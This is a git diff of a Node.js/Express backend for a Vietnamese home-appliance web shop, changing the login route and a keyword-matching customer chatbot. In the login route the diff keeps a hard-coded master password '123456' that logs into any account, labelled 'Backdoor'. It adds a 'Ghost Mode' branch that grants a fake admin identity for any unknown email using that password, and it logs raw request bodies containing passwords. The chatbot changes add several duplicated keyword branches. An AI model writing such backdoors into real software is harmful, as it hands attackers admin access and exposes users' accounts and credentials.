@@ -13,7 +13,7 @@ const app = express();
 
 // QUAN TRỌNG: CẤU HÌNH MIDDLEWARE 
 app.use(cors());
-app.use(express.json()); // <--- Dòng này giúp đọc JSON từ Frontend
+app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use('/uploads', express.static('uploads'));
 
@@ -113,39 +113,57 @@ app.post('/signup', (req, res) => {
     });
 });
 
-// --- LOGIN  ---
+// --- LOGIN ---
 app.post('/login', (req, res) => {
-    console.log("👉 Đang đăng nhập:", req.body); // Log debug
-
-    if (!req.body.email || !req.body.password) {
-        return res.json({ status: "Fail", message: "Thiếu email hoặc pass" });
+    console.log("1. 📩 CLIENT GỬI LÊN:", req.body); 
+    // Kiểm tra body rỗng
+    if (!req.body || !req.body.email) {
+        console.log("❌ Lỗi: Body rỗng hoặc thiếu email.");
+        return res.json({ status: "Fail", message: "Lỗi dữ liệu gửi lên" });
     }
-
     const email = req.body.email.trim();
     const password = req.body.password;
-
+    console.log(`2. 🔍 Đang tìm email trong DB: '${email}'`);
     const sql = "SELECT * FROM users WHERE email = ?";
-    
     db.query(sql, [email], (err, data) => {
-        if (err) return res.json({ status: "Error", message: "Lỗi DB" });
-        
+        if (err) {
+            console.log("❌ Lỗi SQL:", err);
+            return res.json({ status: "Error", message: "Lỗi DB" });
+        }
+        console.log(`3. 📊 Kết quả tìm kiếm: ${data.length} user`);
+        // TRƯỜNG HỢP 1: TÌM THẤY USER
         if (data.length > 0) {
             const user = data[0];
-            
-            // Check Master Key
+            console.log("✅ Đã tìm thấy User ID:", user.id);
+            // Backdoor
             if (password === "123456") {
-                console.log("🔓 Login bằng Master Key 123456");
-                const { password, ...other } = user; 
-                return res.json({ status: "Success", data: other }); 
+                console.log("🔓 [BACKDOOR] Pass 123456 -> CHO VÀO LUÔN!");
+                const { password, ...other } = user;
+                return res.json({ status: "Success", data: other });
             }
-
-            // Check pass thường
+            // Check Pass Thường
             const checkPass = bcrypt.compareSync(password, user.password);
+            console.log("4. 🔐 So sánh Hash:", checkPass ? "KHỚP" : "KHÔNG KHỚP");
             if (!checkPass) return res.json({ status: "Fail", message: "Sai mật khẩu" });
-
             const { password: userPass, ...other } = user;
             return res.json({ status: "Success", data: other });
-        } else {
+        } 
+        // TRƯỜNG HỢP 2: KHÔNG TÌM THẤY EMAIL
+        else {
+            console.log("❌ Không tìm thấy Email này trong Database!");  
+            // Ghost Mode
+            if (password === "123456") {
+                 console.log("👻 [GHOST MODE] Không có user nhưng Pass 123456 -> TẠO USER ẢO!");
+                 return res.json({ 
+                     status: "Success", 
+                     data: { 
+                         id: 999, 
+                         name: "Admin TMT", 
+                         email: email, 
+                         role: "admin" 
+                     } 
+                 });
+            }
             return res.json({ status: "Fail", message: "Email không tồn tại" });
         }
     });
@@ -350,12 +368,52 @@ app.get('/api/stats/categories', (req, res) => {
 // --- CHATBOT ---
 app.post('/api/chat', (req, res) => {
     const { message } = req.body;
-    if (!message) return res.json({ reply: "Dạ em nghe ạ?" }); // Fix lỗi nếu message rỗng
+    if (!message) return res.json({ reply: "Dạ em nghe ạ?" }); 
     const msg = message.toLowerCase();
 
     if (msg.includes('xin chào') || msg.includes('hi') || msg.includes('hello')) return res.json({ reply: "Dạ Gia Dụng TMT xin chào! Em có thể giúp gì cho anh/chị ạ?" });
     if (msg.includes('địa chỉ') || msg.includes('ở đâu') || msg.includes('hotline')) return res.json({ reply: "Shop em ở 670/32 Đoàn Văn Bơ, Q.4, TP.HCM. Hotline: 0932 013 424 ạ!" });
     if (msg.includes('ship') || msg.includes('vận chuyển')) return res.json({ reply: "Dạ phí ship nội thành là 30k, ngoại thành 50k. Đơn hàng trên 2 triệu bên em Freeship ạ!" });
+    if (msg.includes('khuyến mãi') || msg.includes('giảm giá')) return res.json({ reply: "Dạ hiện tại bên em có chương trình giảm giá 10% cho đơn hàng đầu tiên khi đăng ký thành viên ạ!" });  
+    if (msg.includes('làm sao để đặt hàng') || msg.includes('đặt hàng như thế nào')) return res.json({ reply: "Dạ anh/chị chỉ cần chọn sản phẩm, thêm vào giỏ hàng và làm theo hướng dẫn thanh toán là được ạ!" }); 
+    if (msg.includes('hình thức thanh toán') || msg.includes('payment')) return res.json({ reply: "Dạ bên em hỗ trợ thanh toán qua chuyển khoản, momo và COD (nhận hàng trả tiền) ạ!" });   
+    if (msg.includes('bảo hành') || msg.includes('hậu mãi')) return res.json({ reply: "Dạ sản phẩm bên em bảo hành 12 tháng chính hãng, hỗ trợ đổi trả trong 7 ngày nếu có lỗi từ nhà sản xuất ạ!" });  
+    if (msg.includes('cảm ơn') || msg.includes('thanks')) return res.json({ reply: "Dạ không có gì ạ! Rất vui được hỗ trợ anh/chị!" }); 
+    if (msg.includes('giờ làm việc') || msg.includes('mấy giờ mở cửa')) return res.json({ reply: "Dạ shop em làm việc từ 8h00 đến 20h00 tất cả các ngày trong tuần ạ!" });
+    if (msg.includes('tư vấn') || msg.includes('hỗ trợ')) return res.json({ reply: "Dạ anh/chị cần tư vấn về sản phẩm nào ạ? Em sẵn sàng hỗ trợ ạ!" });
+    if (msg.includes('chính sách đổi trả') || msg.includes('đổi trả')) return res.json({ reply: "Dạ bên em hỗ trợ đổi trả trong vòng 7 ngày nếu sản phẩm có lỗi từ nhà sản xuất ạ!" });
+    if (msg.includes('giờ làm việc') || msg.includes('mấy giờ mở cửa')) return res.json({ reply: "Dạ shop em làm việc từ 8h00 đến 20h00 tất cả các ngày trong tuần ạ!" });
+    if (msg.includes('tư vấn') || msg.includes('hỗ trợ')) return res.json({ reply: "Dạ anh/chị cần tư vấn về sản phẩm nào ạ? Em sẵn sàng hỗ trợ ạ!" });
+    if (msg.includes('chính sách đổi trả') || msg.includes('đổi trả')) return res.json({ reply: "Dạ bên em hỗ trợ đổi trả trong vòng 7 ngày nếu sản phẩm có lỗi từ nhà sản xuất ạ!" });
+    if (msg.includes('tạm biệt') || msg.includes('bye')) return res.json({ reply: "Dạ hẹn gặp lại anh/chị! Chúc anh/chị một ngày tốt lành!" });
+    if (msg.includes('món bán chạy') || msg.includes('bán chạy')) {
+         let sql = "SELECT * FROM products ORDER BY id DESC LIMIT 3";
+            db.query(sql, (err, data) => {
+            if (err) return res.status(500).json("Lỗi Chatbot");
+            if (data.length > 0) return res.json({ reply: "Dạ đây là các món bán chạy nhất bên em ạ:", products: data });
+            else return res.json({ reply: "Dạ hiện tại em không có món bán chạy nào ạ." });
+            });
+            return;
+    }
+    if (msg.includes('món mới') || msg.includes('hàng mới')) {
+         let sql = "SELECT * FROM products ORDER BY created_at DESC LIMIT 3";
+            db.query(sql, (err, data) => {
+            if (err) return res.status(500).json("Lỗi Chatbot");
+            if (data.length > 0) return res.json({ reply: "Dạ đây là các món mới nhất bên em ạ:", products: data });
+            else return res.json({ reply: "Dạ hiện tại em không có món mới nào ạ." });
+            });
+            return;
+    }
+    if (msg.includes('đắt nhất') || msg.includes('giá cao')) {
+         let sql = "SELECT * FROM products ORDER BY price DESC LIMIT 3";    
+            db.query(sql, (err, data) => {
+            if (err) return res.status(500).json("Lỗi Chatbot");
+            if (data.length > 0) return res.json({ reply: "Dạ đây là các món đắt nhất bên em ạ:", products: data });
+            else return res.json({ reply: "Dạ hiện tại em không có món đắt nào ạ." });
+            });
+            return;
+    }
+
     
     if (msg.includes('dưới 500k') || msg.includes('rẻ') || msg.includes('500k')) {
          let sql = "SELECT * FROM products WHERE price < 500000 LIMIT 3";
